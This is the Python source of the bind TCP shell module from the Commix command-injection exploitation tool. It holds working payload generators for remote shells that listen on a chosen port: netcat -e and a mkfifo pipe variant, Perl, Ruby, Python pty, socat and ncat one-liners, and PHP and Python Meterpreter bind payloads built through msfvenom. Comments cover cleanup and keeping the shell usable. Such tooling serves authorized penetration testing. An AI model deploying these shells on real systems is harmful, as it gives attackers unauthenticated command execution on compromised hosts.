#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import os
from src.core.parse import cmdline as menu
from src.utils import common
from src.utils import settings
from src.core.controller import checks
from src.core.shells import modes
from src.thirdparty.colorama import Fore, Back, Style, init

"""
Netcat bind TCP shell - one generator, parameterized by which netcat binary to target.
"""
def _netcat_bind_shell(nc_alternative, use_dash_e=True):
  shell = "sh"
  nc_alternative, shell = checks.use_bin_subdir(nc_alternative, shell)

  # Netcat with -e.
  if use_dash_e:
    return nc_alternative + " -l -p " + settings.LPORT + " -e " + shell

  tmp_fifo = checks.random_tmp_path()

  return (
    shell
    + " -c \"rm -f " + tmp_fifo + ";mkfifo " + tmp_fifo + ";"
    + shell
    + " 0<" + tmp_fifo + " | "
    + nc_alternative
    + " -l -p "
    + settings.LPORT
    # Taken away again when the pipeline ends, not only before it starts - cleared on the way in
    # alone, the pipe is left on the target for good once the session closes.
    + " 1>" + tmp_fifo + ";rm -f " + tmp_fifo + "\""
  )

"""
Perl bind TCP shell.
"""
def gen_perl_bind():
  # Relays in Perl itself - the "$~->fdopen" dups leave the shell connected but unusable.
  return (
    "perl -MIO -e '"
    "$c=new IO::Socket::INET(LocalPort,"
    + settings.LPORT +
    ",Reuse,1,Listen)->accept;"
    "select($c);$|=1;"
    # chdir() persists for the process, and qx() inherits it - so "cd" carries to the next command.
    "while(<$c>){chomp;if(/^cd\\s+(.+)/){chdir($1);next;}print $c qx($_);}'"
  )

"""
Ruby bind TCP shell.
"""
def gen_ruby_bind():
  return (
    "ruby -rsocket -e '"
    "s=TCPServer.new("
    + settings.LPORT +
    ");c=s.accept;"
    "s.close;"
    "$stdin.reopen(c);"
    "$stdout.reopen(c);"
    "$stderr.reopen(c);"
    "$stdin.each_line{|l|l=l.strip;"
    "next if l.length==0;"
    "(IO.popen(l,\"rb\"){|fd| fd.each_line {|o| c.puts(o.strip)}}) rescue nil }'"
  )

"""
Python bind TCP shell.
"""
def gen_python_bind():
  return (
    settings.LINUX_PYTHON_INTERPRETER
    + " -c 'import pty,os,socket%0d"
    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)%0d"
    "s.bind((\"\","
    + settings.LPORT +
    "))%0d"
    "s.listen(1)%0d"
    "(rem, addr) = s.accept()%0d"
    "os.dup2(rem.fileno(),0)%0d"
    "os.dup2(rem.fileno(),1)%0d"
    "os.dup2(rem.fileno(),2)%0d"
    "pty.spawn(\"/bin/sh\")%0d"
    "s.close()'"
  )

"""
Socat bind TCP shell.
"""
def gen_socat_bind():
  return "socat tcp-listen:" + settings.LPORT + " exec:\"sh\",pty,stderr,setsid,sigint,sane"

"""
Ncat bind TCP shell.
"""
def gen_ncat_bind():
  # Without '-k', as every other bind payload here: kept listening, it leaves an unauthenticated
  # shell open on the target after the session that asked for it has ended.
  return "ncat -l " + settings.LPORT + " -e /bin/sh"

"""
PHP meterpreter bind TCP shell (via msfvenom).
"""
def gen_php_meterpreter_bind():
  if checks.metasploit_missing():
    return None

  payload = "php/meterpreter/bind_tcp"
  output = "php_meterpreter.rc"
  info_msg = "Generating the '" + payload + "' payload. "
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))

  try:
    data = checks.generate_msf_payload(payload, output, "RHOST", settings.RHOST, " -e php/base64", strip_newlines=True)
    if settings.TARGET_OS == settings.OS.WINDOWS and not settings.USER_DEFINED_PHP_DIR:
      checks.set_php_working_dir()
      other_shell = settings.WIN_PHP_DIR + " -r " + data
    else:
      other_shell = "php -r \"" + data + "\""
    checks.msf_launch_msg(output)
    return other_shell
  except:
    settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
    return None

"""
Python meterpreter bind TCP shell (via msfvenom).
"""
def gen_python_meterpreter_bind():
  if checks.metasploit_missing():
    return None

  payload = "python/meterpreter/bind_tcp"
  output = "py_meterpreter.rc"
  info_msg = "Generating the '" + payload + "' payload. "
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))

  try:
    data = checks.generate_msf_payload(payload, output, "RHOST", settings.RHOST, "", strip_newlines=False)
    if settings.TARGET_OS == settings.OS.WINDOWS:
      if not settings.USER_DEFINED_PYTHON_DIR:
        checks.set_python_working_dir()
      other_shell = settings.WIN_PYTHON_INTERPRETER + " -c " + "\"" + data + "\""
    else:
      if not settings.USER_DEFINED_PYTHON_INTERPRETER:
        checks.set_python_interpreter()
      other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c " + "\"" + data + "\""
    checks.msf_launch_msg(output)
    return other_shell
  except:
    settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
    return None

# Module path (relative to "bind_tcp/") -> (description, generator).
BIND_TCP_MODULES = {
  "netcat/traditional":  ("Netcat-Traditional", lambda: _netcat_bind_shell("nc.traditional")),
  "netcat/busybox":      ("Netcat-Busybox",   lambda: _netcat_bind_shell("busybox nc")),
  "netcat/openbsd":      ("Netcat-Openbsd (no '-e' support)", lambda: _netcat_bind_shell("nc", use_dash_e=False)),
  "perl":                ("Perl bind TCP shell",               gen_perl_bind),
  "ruby":                ("Ruby bind TCP shell",               gen_ruby_bind),
  "python":              ("Python bind TCP shell",             gen_python_bind),
  "socat":               ("Socat bind TCP shell",              gen_socat_bind),
  "ncat":                ("Ncat bind TCP shell",                gen_ncat_bind),
  "meterpreter/php":     ("PHP Meterpreter bind TCP shell",    gen_php_meterpreter_bind),
  "meterpreter/python":  ("Python Meterpreter bind TCP shell", gen_python_meterpreter_bind),
}

"""
Set up and choose the bind TCP connection - the prompt itself is the shared mode loop.
"""
BIND_TCP_MODE = modes.ShellMode(
  name="bind_tcp",
  modules=BIND_TCP_MODULES,
  help_menu=menu.bind_tcp_options,
  option_rows=lambda: [
    ("RHOST", settings.RHOST, True, "The target host to connect to"),
    ("LPORT", settings.LPORT, True, "The listening port"),
    ("HANDLER", "on" if settings.HANDLER else "off", False, "Catch the shell locally (instead of an external listener) (nc/ncat)"),
  ],
  required=("RHOST", "LPORT"),
  required_hint="Required options not set. Use 'set rhost <ip>' and 'set lport <port>'.",
  set_options=(
    ("rhost", checks.check_rhost),
    ("lport", checks.check_lport),
    ("handler", checks.check_handler),
  ),
  unsupported=("lhost", "rhost"),
  build=lambda module_path, separator: BIND_TCP_MODULES[module_path][1](),
  usage_hint="Use 'set rhost <ip>' and 'set lport <port>' to configure the bind TCP connection.",
)

# The options this mode offers, printed when the user asks for them.
def bind_tcp_options(separator, filename, url):
  return modes.shell_mode_options(BIND_TCP_MODE, separator, filename, url)

# eof
